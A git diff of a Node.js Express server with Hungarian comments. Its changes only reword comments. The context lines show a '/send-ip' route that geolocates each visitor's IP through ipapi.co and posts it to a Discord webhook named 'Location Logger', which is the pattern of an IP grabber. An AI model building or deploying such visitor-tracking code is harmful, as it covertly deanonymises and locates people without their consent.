@@ -1,4 +1,5 @@
-require('dotenv').config(); // Betölti a .env fájlban lévő változókat
+require('dotenv').config(); // Betöltjük a .env fájlban lévő változókat
+
 const express = require('express');
 const axios = require('axios');
 const app = express();
@@ -7,7 +8,7 @@ const port = process.env.PORT || 3000;
 // Discord Webhook URL betöltése a környezeti változóból
 const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
 
-// Alapértelmezett HTML fájlok kiszolgálása
+// Statikus fájlok kiszolgálása
 app.use(express.static('public'));
 
 // IP cím és hely információ küldése a Discordra
@@ -19,7 +20,6 @@ app.get('/send-ip', (req, res) => {
             return fetch(`https://ipapi.co/${ipadd}/json/`)
                 .then(geoResponse => geoResponse.json())
                 .then(geoData => {
-                    // Webhook küldés Discordra
                     const message = {
                         username: "Helyszíni Naplózó <3",
                         avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
